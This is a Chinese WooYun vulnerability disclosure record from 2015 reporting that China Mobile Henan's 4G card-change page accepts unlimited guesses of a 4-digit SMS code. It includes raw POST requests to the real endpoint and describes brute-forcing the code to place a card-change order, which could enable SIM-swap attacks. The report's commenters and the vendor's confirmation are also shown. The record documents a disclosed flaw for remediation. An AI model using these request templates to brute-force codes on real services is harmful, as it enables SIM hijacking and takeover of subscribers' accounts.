{"id": 45717, "wybug_id": "wooyun-2015-094207", "wybug_title": "中国某省移动4G自助升级页面存在弱动态密码（可能导致补卡攻击）", "wybug_corp": "中国移动", "wybug_author": "浮萍", "wybug_date": "2015-01-29 11:20", "wybug_open_date": "2015-03-15 11:22", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-15：\t细节向公众公开  简要描述： 中国某省移动4G自助升级页面存在弱动态密码（可能导致补卡攻击） 详细说明：  河南移动商城4G换卡\nhttp://ha.10086.cn/mshop/phonenum/v6phonenum!changeCardByValidateCode.action\n微信中或手机浏览器访问   漏洞证明：  中国移动河南10086微信\n\n免费换4G输入手机号抓包如下可以无限哦而且验证码是4位的可以爆破\nPOST /mshop/phonenum/v6phonenum!changeCardByValidateCode.action HTTP/1.1Accept-Language: zh-CNAccept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7Referer: http://ha.10086.cn/mshop/phonenum/v6phonenum!cardchange.actionUser-Agent: Mozilla/5.0 (Linux; U; Android 4.1.2; zh-cn; GT-I9100 Build/JZO54K) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/5.4 TBS/025410 Mobile Safari/533.1 MicroMessenger/6.1.0.56_r1021013.540 NetType/WIFIOrigin: http://ha.10086.cnAccept: application/vnd.wap.xhtml+xml, text/vnd.wap.wml, application/xhtml+xml, text/html, image/png, image/jpeg, image/gif, */*;q=0.1Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzipProxy-Connection: keep-aliveHost: ha.10086.cnCookie: xXXXXXContent-Length: 69mealId=4437606&payType=2&special4g=1&phoneNo=手机号码&messageCode=\n\n\n输入一个验证码试试\n\n抓包爆破\nPOST /mshop/phonenum/v6phonenum!changeCardByValidateCode.action HTTP/1.1Accept-Language: zh-CNAccept-Charset: utf-8, iso-8859-1, utf-16, *;q=0.7Referer: http://ha.10086.cn/mshop/phonenum/v6phonenum!changeCardByValidateCode.actionUser-Agent: Mozilla/5.0 (Linux; U; Android 4.1.2; zh-cn; GT-I9100 Build/JZO54K) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/5.4 TBS/025410 Mobile Safari/533.1 MicroMessenger/6.1.0.56_r1021013.540 NetType/WIFIOrigin: http://ha.10086.cnAccept: application/vnd.wap.xhtml+xml, text/vnd.wap.wml, application/xhtml+xml, text/html, image/png, image/jpeg, image/gif, */*;q=0.1Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzipProxy-Connection: keep-aliveHost: ha.10086.cnCookie: XXXXXXContent-Length: 73mealId=4437606&payType=2&special4g=1&phoneNo=XXXXX&messageCode=5555\n跑出验证码是4444\n\n\n\n（PS  这个显示验证码不正确是输入5555时出现的错误）然后点击我要立即换卡订单填写\n\n\n\n而且还可以查看订单这里不演示了   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-02-02 13:38 厂商回复： CNVD确认所述情况，已经转由CNCERT向中国移动通报。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-29 11:20 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  这个可能会给别人的移动sim卡给补来。。。    \n     2015-01-29 12:09 |    \t\t北洋贱队 \t\t\t( 普通白帽子  |\t\t\t        Rank:252 漏洞数:25        )\t\t \n  @疯狗  很久以前发布过的漏洞  怎么可以再次审核通过呢请看WooYun-2014-69500    \n     2015-01-29 12:36 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @北洋贱队 漏洞不一样啊    \n     2015-01-29 12:49 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  @北洋贱队 漏洞不一样啊     \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}